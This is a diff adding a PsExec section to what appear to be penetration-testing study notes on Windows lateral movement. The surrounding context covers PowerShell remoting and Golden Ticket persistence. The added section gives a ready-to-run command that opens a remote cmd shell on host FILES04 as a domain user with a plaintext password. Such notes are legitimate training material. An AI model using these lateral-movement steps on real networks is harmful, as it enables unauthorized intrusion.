@@ -233,6 +233,14 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 New-PSSession -ComputerName 192.168.50.73 -Credential $credential
 Enter-PSSession 1(id)
 ```
+###### Psexec
+```
+Requirements:
+1. the user that authenticates to the target machine needs to be part of the Administrators local group
+2. the ADMIN$ share must be available and File and Printer Sharing has to be turned on
+
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
 ### Persistence
 ###### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
 ```
